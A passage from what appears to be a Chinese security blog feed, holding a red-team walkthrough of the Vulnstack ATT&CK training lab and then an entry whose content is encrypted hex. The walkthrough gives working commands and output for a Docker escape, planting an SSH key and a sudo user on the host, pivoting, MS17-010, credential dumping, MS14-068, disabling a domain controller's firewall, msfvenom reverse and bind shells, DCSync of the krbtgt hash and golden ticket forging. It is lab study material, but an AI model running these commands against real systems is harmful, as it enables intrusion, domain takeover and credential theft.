alt="attck411.png"></p><p>可看到成功了，并返回一个shell</p><p>然后我们去访问上传的<code>pwn.jsp</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck412.png" alt="attck412.png"></p><p>在输入框中可执行命令</p><h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>参考：<a href="https://daolgts.github.io/2019/10/07/docker%E5%AE%89%E5%85%A8/">docker安全</a></p><p>使用<code>cve-2019-5736</code>实现<code>docker</code>逃逸  <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">EXP</a></p><p>下载后编辑<code>main.go</code>，将命令改为如下反弹<code>shell</code>命令</p><p>6</p><p>使用<code>go</code>语言编译，得到<code>main</code>文件</p><p>通过冰蝎上传<code>main</code>文件，一执行就卡死，于是反弹<code>shell</code>到<code>kali</code><br>使用冰蝎反弹<code>shell</code>到<code>msf</code>，反弹<code>meterpreter</code>发现进不了<code>shell</code>也无法执行文件，直接反弹<code>shell</code>不能接收</p><p>于是使用另外的方式反弹<code>shell</code>，首先使用<code>msf</code>生成一个反弹<code>shell</code>的后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.150.141 LPORT=5555 -f raw &gt; shell1.jsp</span><br></pre></td></tr></table></figure><p>然后将它通过冰蝎上传到网站根目录<code>/usr/local/tomcat/webapps/ROOT/</code>，执行成功反弹<code>shell</code>，然后运行<code>main</code></p><p>输入框中执行<code>ls /dev</code>，可以看到docker虚拟的硬盘</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck413.png" alt="attck412.png"></p><p>我们试一下挂载</p><p>在根目录创建一个<code>test</code>文件夹，<code>mkdir /test</code></p><p><code>mount /dev/sda1 /test</code>，看一下是否挂载成功，<code>ls /test</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck414.png"></p><p>挂载成功</p><p>我们查看一下<code>/home</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck415.png"></p><p>查看隐藏文件，<code>ls -lah /test/home/ubuntu</code>，可以看到<code>.ssh</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck416.png"></p><p>查看<code>.ssh</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck417.png"></p><p>接下来我们就利用ssh实现docker逃逸</p><p><code>ssh-keygen -f kali</code>生成私钥</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck418.png"></p><p><code>chmod 600 kali</code>，不然用不了</p><p>这里我们写一个<code>test.sh</code>脚本，方便执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp -avx /test/home/ubuntu/.ssh/id_rsa.pub /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">echo &gt; /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl13XtnQ/CEiD7SZLBXR8sbpEb7aXb3CMMpCZabybfg1eXitxiT+V7ypF1v8yjlRVGk7LqVeCD1nGI5d/VaDSW3fqe6fxZBH+8nAuuWbt6oEdkndaDuPgSHBZSkGJDQsePq9WOQ1tNUx7v2Jg7pMuIdd9kTQOVgK4xL2KGxddTwmpJCkv1gNn6Vd99ASWLIRKPNYdLvQ4lGAn6gPz39LBfDXaU8ri93HA75IIzz+7nXETfkx6x82vr0GuEmJBmqRRHxAQo8zAl3XC+X/tkPrSCr4OH26Rt3dQ9EL+eJJI8hSpWxGfC2uvauFQ8Brx+SuSnUAO9RevbAUyQDXyuI8LXu3vJL2Grw2tb9FDsIAEHtHUZ8o4od6xhyWThiv2hrL8nKHXzpuypTZ6WCznP6inYaCOFpChtU01kHptmzBreNy33HveKxMjKd5338dB4zSaIaaNqPKizjoejk7oRBJkuGyqecrwL3ReToj+FM02QnjK1kESpEspMTuOF5m6vwL0= kali@kali&#x27; &gt; /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">cat /test/home/ubuntu/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>保存，开启一个http服务，在目标下载</p><p><code>python -m SimpleHTTPServer</code></p><p>在输入框下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.150.141:8000/test.sh</span><br></pre></td></tr></table></figure><p><code>chmod 777 test.sh</code> ，<code>ls -la</code>看一下</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck419.png"></p><p>执行<code>test.sh</code>，<code>bash test.sh</code>，成功</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck420.png"></p><p>在<code>kali</code>上用<code>ssh</code>连接一下，并没有什么用，因为我们不知道密码。。。。</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck421.png"></p><p>那么我们该怎么办呢？可以添加用户，但不能在输入框中添加，否则添加用户到了<code>docker</code></p><p>这里我们可以修改配置文件也可以添加用户</p><p>写个脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /test/etc/passwd</span><br><span class="line">chmod 777 /test/etc/shadow</span><br><span class="line">chmod 777 /test/etc/sudoers</span><br><span class="line">mkdir /test/home/kali</span><br><span class="line">chmod 777 /test/home/kali</span><br><span class="line">echo &#x27;kali:x:1001:1000:kali,,,:/home/kali:/bin/bash&#x27; &gt;&gt; /test/etc/passwd</span><br><span class="line">echo &#x27;kali:$6$dZhS1PQKuhRB3dMq$GVQsHMiD7221rqrnfxGxP6X9Pn271DJ2N299OHzWPoR6SmSQnk7mSK96BP9ZETvqkfFs1HFbMWkxD9kCSX10H1:18397:0:99999:7:::&#x27; &gt;&gt; /test/etc/shadow</span><br><span class="line">echo &#x27;kali  ALL=(ALL:ALL)  ALL&#x27; &gt;&gt; /test/etc/sudoers</span><br><span class="line">cat /test/etc/shadow</span><br></pre></td></tr></table></figure><p>输入框下载，<code>chomd 777 adduser.sh</code>，执行<code>bash adduser.sh</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck422.png"></p><p>在<code>kali</code>上登录</p><p><img src="http://www.sectime.top:8888/images/2020/05/15/attck423.png"></p><p>这里需要注意几点：</p><ol><li><code>ssh -i kali ubuntu@192.168.150.160</code>必须在<code>kali</code>上的<code>kali</code>用户下执行</li><li><code>sudoers</code>文件的权限只能是只读，上面我们改成<code>777</code>，需要把它改成<code>440</code></li><li><code>sudo -s</code>提升权限到<code>root</code></li></ol><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>利用<code>chisel</code>搭建代理</p><p><a href="https://xax007.github.io/2019/04/12/pivoting-with-chisel.html">https://xax007.github.io/2019/04/12/pivoting-with-chisel.html</a></p><p>目标机器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ./chisel server -p 9001 --socks5</span><br></pre></td></tr></table></figure><p>kali</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ./chisel client 192.168.150.160:9001 socks</span><br></pre></td></tr></table></figure><p>上大杀器<code>metasploit</code>，利用<code>ms17-010</code>，返回<code>meterpreter</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck443.png" alt="attck443.png"></p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><code>getuid</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p><code>ps </code>查看应用创建的服务</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck424.png" alt="attck424.png"></p><p>输入<code>shell</code>，进入系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2108 created.</span><br><span class="line">Channel 1 created.</span><br></pre></td></tr></table></figure><p><code>net view</code>，存在<code>demo</code>域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net view /domain</span><br><span class="line">net view /domain</span><br><span class="line">Domain</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">DEMO                 </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p><code>net view /domain:demo</code>查看域内机器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net view /domain:demo</span><br><span class="line">net view /domain:demo</span><br><span class="line">Server Name            Remark</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">\\TESTWIN7-PC   </span><br><span class="line">\\WIN-ENS2VR5TR3N                                                              </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p><code>net group &quot;domain ontrollers&quot; /domain</code>查看域控</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck425.png" alt="attck425.png"></p><p>出现这种情况，首先<code>exit</code>退出shell，然后<code>steal_token 进程号</code> ，再<code>shell</code>进入</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck426.png" alt="attck426.png"></p><p>域控：\\WIN-ENS2VR5TR3N </p><p><code>wmic computersystem get domain</code>查看完整域名</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck427.png" alt="attck427.png"></p><p><code>net group &quot;domain admins&quot; /domain</code>查看域内管理员</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck428.png" alt="attck428.png"></p><p><code>net group &quot;domain users&quot; /domain</code> 查看域内用户</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck429.png" alt="attck429.png"></p><p><code>nslookup \\WIN-ENS2VR5TR3N  </code> 查看域控IP</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck430.png" alt="attck430.png"></p><p><code>whoami /all</code>获取用户<code>SID</code>: <code>S-1-5-21-979886063-1111900045-1414766810-1107</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck431.png" alt="attck431.png"></p><p>域的<code>SID</code>，用户<code>SID</code>去掉最后的<code>-</code>及其后面的，即<code>S-1-5-21-979886063-1111900045-1414766810</code></p><p>信息收集到这就差不多了，当然越详细越好。</p><p><strong>抓密码</strong></p><p><code>rev2self</code>提升权限，调用<code>kiwi</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck432.png" alt="attck432.png"></p><p><code>creds_all</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck433.png" alt="attck433.png"></p><p><strong>注意：</strong> 因为登录过域成员，所以密码是明文</p><p>如果没有登录过，可以用上面的<code>NTLM hash</code></p><p><code>systeminfo</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck434.png" alt="attck434.png"></p><p>我们可以利用<code>mss14-068</code>，搜索其补丁号，若没有打补丁，说明漏洞存在</p><p>这个靶场做的很贴心，里面有很多工具，若没有，我们可以自己上传</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck435.png" alt="attck435.png"></p><p>开搞！！！</p><p>假如我们想查看域控的C盘根目录<code>dir \\WIN-ENS2VR5TR3N\c$</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck436.png" alt="attck436.png"></p><p>发现不行，我们要使用<code>MS17-068</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u douser@demo.com -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck437.png" alt="attck437.png"></p><p>生成了一个票据，用<code>mimikatz</code>导入</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck438.png" alt="attck438.png"></p><p>再次执行<code>dir \\WIN-ENS2VR5TR3N\c$</code>，成功</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck439.png" alt="attck439.png"></p><p>远程执行命令</p><p>创建关闭防火墙的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create ProtectFirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck440.png" alt="attck440.png"></p><p>制作反弹shell木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6001 -f exe-service -o update.exe</span><br></pre></td></tr></table></figure><p>上传到域成员douser，查看当前目录<code>pwd</code>，<code>upload update.exe</code></p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck445.png" alt="attck445.png"></p><p>创建反弹shell服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N create Shell binpath= &quot;C:\update.exe&quot;</span><br></pre></td></tr></table></figure><p>设置监听，先不执行</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck444.png" alt="attck444.png"></p><p>执行关闭防火墙的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N start ProtectFirewall</span><br></pre></td></tr></table></figure><p>虽然提示失败了，但是防火墙确实关闭了</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck441.png" alt="attck441.png"></p><p>执行反弹shell服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\WIN-ENS2VR5TR3N start Shell</span><br></pre></td></tr></table></figure><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck446.png" alt="attck446.png"></p><p>开启监听，shell弹回来，拿到域控的shell</p><p><img src="http://www.sectime.top:8888/images/2020/05/16/attck447.png" alt="attck447.png"></p><p>接下来，我们可以抓key，构造黄金令牌</p><p><code>load kiwi</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">Loading extension kiwi...</span><br><span class="line">  .#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;        Vincent LE TOUX            ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/</span><br><span class="line"></span><br><span class="line">Success.</span><br></pre></td></tr></table></figure><p><code>help</code>可以帮助我们查看<code>command</code>文档</p><p><code>dcsync_ntlm</code> 来还原<code>krbtgt</code>的<code>hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; dcsync_ntlm krbtgt</span><br><span class="line">[!] Running as SYSTEM, function will not work.</span><br></pre></td></tr></table></figure><p>出现这种情况，我们需要伪造administrator，然后再执行<code>dcsync_ntlm krbtgt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; steal_token 1952</span><br><span class="line">Stolen token with username: DEMO\administrator</span><br><span class="line">meterpreter &gt; dcsync_ntlm krbtgt</span><br><span class="line">[+] Account   : krbtgt</span><br><span class="line">[+] NTLM Hash : 7c4ed692473d4b4344c3ba01c5e6cb63</span><br><span class="line">[+] LM Hash   : 4d81a5d6b591f0710e75884e5ef9cba2</span><br><span class="line">[+] SID       : S-1-5-21-979886063-1111900045-1414766810-502</span><br><span class="line">[+] RID       : 502</span><br></pre></td></tr></table></figure><p><code>golden_ticket_create</code>构造黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; golden_ticket_create -d demo.com -u Administrator -s S-1-5-21-979886063-1111900045-1414766810 -k 7c4ed692473d4b4344c3ba01c5e6cb63 -t /home/kali/kali.tck</span><br><span class="line">[+] Golden Kerberos ticket written to /home/kali/kali.tck</span><br><span class="line"></span><br><span class="line">参数介绍</span><br><span class="line">-t /home/kali/kali.tck</span><br><span class="line">-d  域名</span><br><span class="line">-u  要伪造的用户</span><br><span class="line">-s  域SID</span><br><span class="line">-k  krbtge的ntlm</span><br><span class="line">-t  保存的本地路径</span><br></pre></td></tr></table></figure><p>导入黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eter &gt; kerberos_ticket_use /home/kali/kali.tck</span><br><span class="line">[*] Using Kerberos ticket stored in /home/kali/kali.tck, 1820 bytes ...</span><br><span class="line">[+] Kerberos ticket applied successfully.</span><br></pre></td></tr></table></figure><p>查看域控的c盘根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;dir \\WIN-ENS2VR5TR3N\c$</span><br><span class="line">dir \\WIN-ENS2VR5TR3N\c$</span><br><span class="line"> Volume in drive \\WIN-ENS2VR5TR3N\c$ has no label.</span><br><span class="line"> Volume Serial Number is 702B-0D1B</span><br><span class="line"></span><br><span class="line"> Directory of \\WIN-ENS2VR5TR3N\c$</span><br><span class="line"></span><br><span class="line">2009/07/14  11:20    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2020/01/24  13:30    &lt;DIR&gt;          Program Files</span><br><span class="line">2020/01/24  13:30    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2020/05/16  11:39            48,640 update.exe</span><br><span class="line">2019/12/31  11:01    &lt;DIR&gt;          Users</span><br><span class="line">2020/01/24  13:33    &lt;DIR&gt;          Windows</span><br><span class="line">               1 File(s)         48,640 bytes</span><br><span class="line">               5 Dir(s)  12,438,585,344 bytes free</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Vulnstack是红日安全团队出品的一个实战环境，本次测试的红日安全 ATT&amp;amp;CK实战系列——红队评估（四）靶场环境，下载地址：&lt;</summary>
      
    
    
    
    <category term="实战" scheme="http://lvpsectime.github.io/categories/%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="实战" scheme="http://lvpsectime.github.io/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-2555复现</title>
    <link href="http://lvpsectime.github.io/post/36799.html"/>
    <id>http://lvpsectime.github.io/post/36799.html</id>
    <published>2020-05-12T12:42:45.000Z</published>
    <updated>2021-09-15T14:13:57.933Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="14b39b6f3e2a161cde134d2c1f35e87c657679074237442fd9dc08ff8b0dd9af">94818f561542136a5f12a1f20ba90f292bf3a19ace642ed5d0b7a732ee6f356225f80e646fed4769d5ba35faf6225069b89fe4d414a00086f3adc7c7ae80c489d03c822ce10c63316ba9c7ab395adffad1523b4fa19798bf924ee721c1c34ce856d3b517a5f70fe3cd5ca32f718c808b82fe48f0fc92c2b1613159fb600066bc6f6e8a8d3d6c5978f37c4c40d2358464b463565f78151f8c3847cf68267b37290fb3e0fb6550dbf0a5a88fd89f060c0e650f7511b8dcf8647d2c9b0aab58b8defb9abba83d57a2921087c5f2d3fb502085d9c2043b7309295ba9bae5974a4255363a9029ee1358cc1438d25bfb1dad17a0463bb4c9d6b216a45ac363e87fe5e46b72e2efaa017b1888e06c1d6dd41097f6cf5388b48f5216a68c30925d54743648c6f50d70c9bf2baae4e00d93b5fd3221501a429cfd6a22dcc26eba5d0307ee1b5d9ca18d34f07b8e22f3cc6a56c9485b6f35eeca66636093feeb276de3dddc157f9d927d265662995f9500b3b2abb174aadb59a6bd6576a0f6defe39647ed7c3eb9bd9cd1d32eab11944279778cc9f0352387a5c0104f06fb0bbb2910807fd5e633962b0241cd2428783946cbc51006a44b4775f84e9a1b855745b42816f0ef5c0fea60056e3bf352f8d6190437d68dd50014d3a0389f8a2ec2f130425444a039e603b68e60ed4619c2e2d2db4dda43aae179462bc05c1ed751664f9094c281331919a37c02d742a2dffc07b60bfb07113da111ca3e1851495f20696cac305dfab6615e86fb3a8c43a55fe619b51632605cd9e16aea9551a69ba85cd87ff67245c8149d8ee4ee8269cba6bbe13a412f5ad413daae8b8b319106f091d31da76c1bd2f350aa6031c43f10f9ac223c23068b3ec2f5fee19c5dea747b3bfb21bf95935eb3e03dd04fa00b29cf3240053142a6af03b4a5ff279d17726188294f2d7e5640be77e97d3c18441ac6bd1056e961743f8aad5ada5b81f1a063df8c958c1187ecf48a76e1b539936cdd01760e5eb74234e0550be6acb4e51bc0a173a9e7feaa7e1f94a323fb0ac685704d685e83fec0f18e2eeea0f843623b8459dfeb2fa51da2cd68d627abdce25f89653c2000dcf92a4871409b23e198eedaeb50e8d485b14573c993250b8580ca9ab45914b832cd16cec23fe0ffa83161cfd25c03a0e280fad6361a1da44961fbef327e0b22554e60b33ece58232c80fd18a14e615f546bf0581809ee4d9a2ca8cbf9903512c56ca2f26a89e779ee30322c387999b6d15a096dcba0c88531f57ce75572f504d33c001e3a61ab67b1b7999ee9fa86e675c3801ffd1facb1c45b9bda84faa590507f707efdf6fde331c35336ffa92292a79b5724ce031587d7c1681df76c059a762b433459f72338ceb1d3469f8925a69cb73eaf3ba03077d1ba640c1e62cf5a4475ae7738fc072e19b36e9d5a37c25d3c1791da37394330a0d08292c085d0ab3cea39642adfb46f4f997a1e978af915d8962a14e1eaabd05d7577ed511018b03566e10a4ef2b121082e3585c4e6a0fbe05a18c485b56f3e7d9bb5a03ddf8dd64c6320ba4c177d98c382fd991973cf8349264f60c9c8d1d8523c80bec03e2393cc5897af1a396800ac33c6fe712ac7c02213c25d6d18affa55fca45f8321d827e2af89c382c6fe7af48de15194f4aaf6d55d2e19b8324b79c2050ee19f06eb3d4c44efdbc3cf00ddf44db28456dbf763d2d27eb3ffd5ecf4e3e55dd28ef1933bd56f8f578524a28cdff005cea050a34cd0090cbda30aaa7fb504a7f5edf5a33a0c40d45696f30d7e6571e62c89e485f2482e288c29e0ca463a82001a85bd6dc9f6520690c1e6f9793ea6fc5c382f0837085ef0e786d6e291cbaec9665a04fb4555b2f06ae520806e496946c65469c1ac5ae8aa3229972ecd72cb56f7bfe0d367dcd14a9c6bf55afe263c5e8f0eb1b09d544b87262495d7651bf729ac5a7989a3367483361cb839f4cfe8712ec9c0befdf550a361df50e8fa35b7e18c874e0e44c4b421bc30dbee0a246599267f422aa09b963280ae5f6d5c7b0d97da56ffd3c42c2c43373510275b16d0caeb72170adb5db95330467829d0737fbd67f48c4ae788aac004bd59fc8044c1a39af28eb5c7ed3bb575591fb62df8bd12d743f3bfe730b085216544f631ddd61862def4f228a361cc23c98df4c3873e33e1781e5832467d1db61d3f3a7eaac0f6e1b149d01012e19a673aad52a99f3a89c4195d121da14f4f7c65178a8568af70d3a5d21db5833c0ad3d2201a6053b870da9e6bea9418fa101fd75bd56e0dd87c79423696a3f300da72a8f0e7e4298ef42d1d04f06dd9441273a053955d5b30d8caccdfa7895ac838a04404ca1bfb679026fbdf24f0ae0ae3475b972888baea3710ab8d6875f61e738e56272ecac69d4b8f16fc4a39a8254e1e61d59df273c91f5a6f5c173fabb971523976e3101483ab71f8abb8b4829fd7e04b43a21f27112a99772ce8dca54d9c5fcc804a135680a5027186805a76e7208c8d6bb4165ad25a3fb6f7babab3b6304e3ba4c201111016960f7e910d3ff82cb53b4458783c1793cb4762a9ff4fe2b2072eb0c10d0618a5a7923141cb7befcca2eb0b6bdb8bb914b29f0d7d701b91bd0c5365cac34d5b6610d499d63655b180f7fccc4d17d0628e232d76b6f77bb50d57a0610902a9386d6a24f8751b7d3c2e6fc8325a66394c925852e34593b68f1d45aa332a8840add569feaa0b10c3a6bcccdd51cc4c9e933acb419c7a2b64bbe65b330eb880e55bbf476ad7ddb07f9a94895beeb69e2530a96acba48b5ae70776e3fe18ea87df6e2d3b7f7598259564778847fc3bf048976ac646c92f4ee55b67cbad14c6716239c2d64e05db3a08acd8567a857b964a923a025c170201ee45e35b5ee8047769d027f6ebcd6a0eb40293d9cc1d4c3c8a1e982f43b224cb933d58d72bdae402f0215469eca77d50a816fc4176393220c5be26d023abaf674e4ed4f86129f50a4dd0388d1d932ff1b5bb1e48da56773d1bf7ee4e88b8b9f0d55e93435c1ad35bce6efd1bf494e71c78e53872bf203ea426daf3900dba6ad706fc391cedb6c13f0b0ec5ed4210b1df294cb8419d5533e6cac131dd56b4b2cb7c6b2e9d8480156dadab85fc3d45463348d3557c2a9d4542158a14e28a5b8b45489eff2d4917d941dede4cef1095c8ce3982332dda0021bb7ebed93b27b703f8fe195c3030632098719f60fe127af1fd444957587c3efa8e8b48145c0082f1db1e8778921a752704d689dc2314ea7fcda56f97c6d4af4135f68cc2b9ce6cbffc80d831ed85c9182bd9c2a5bf3515a25363bd073d5883f98700e06bb087ef86bf98318e65c00b1e0218d9931c6b043487fa777a388e92d36be36a154928297c7fb6c8e93aa4ebb801b918447531de18c2cf5a1cdba2024a2ed3eae3edcd729e3b6f8e1a1b8dc407dd86df703854fca80a9a6155fc5e3bc919a9aee5ae6781c2101f946949185506677c055ed0d4887fba87a142c8f84490cd1740901fcc9cc1b24af6983c98f472c1f20076d7c04363cddea23250e9963ef33fa632a10a8930a2a12023823c6ce9cbd90a12708c53178b6c10fa43d3aa3ece1ca06877fa4642df7038517ec9abac09d5af28f2f3682478afc5363b18d1658154947cd8c8a3eb9fff3f27d6eeb9fff9eaf8a9bdce3b0f3f97e070632f3a24e4cb5ed622503ab3a898f2d4db7596ebcfc3b698926edeac5a837462140b801cd529756b3d6ff5a43b193355fd79b5330956dad0825414454efd0a7b006ad2b0dfbda4fcb3f3a4c2ad99929faff59fe7291e5144e1a02f68c3d26e00b0489b4de4c3edf61a64429d3cc4d755297c11af65364da3b58305a016cc82ab048dfbdbacf1f1678d18c29a611ade07d6fedd4dd13efbb29752432d6dbe4cb6ab44e707f3283a971eace82656df4dd93f771c5771f6213923deef12cc38a26eb22eb812298fd353a11232111c2988b9a3aeb223f9945eb836ff7b89e335c331aacad0e7590a5d456895fe81015d6984dcd45103501a860e8a2475a037bf516304556873ea2256ceb6fe94d7291c584b3babd0e4d844010433db30a74a92ccde08331b3e0f77a9c186823fa2533483ea666dd7ece05f060aa16995b2ce56ada88625a631a34429de927e43f397c62aea895f75cc9b8a5a309880d4cbc6f6e514f76c667d254c819572a943236eaf0af803c1586aec7d55f325f19ff2e2bd002d547838bcd5b2569f731136737b587089ea98bf3298c6b636eb3767fb966c55195b86c2c95353d693c5dddba779602a80da73b0b21a325a65914f7f00a88d8bca77d53666cfab4ebcd280715df61e3bb862fe1eaa6ded2780860d6df5edd269c581cbd929e11f55a63268a419d444ab14d9528708c21780a26e238d58e891c96871be3072faa70f493d2bf02ff1532a9d2d436d9799350a65b57359edbc55c0b36399a755ac3e9529e5613f62261286fd4599b9a77d8bbd1aa5a5eb87958c0576f0d4895e4090572702558131b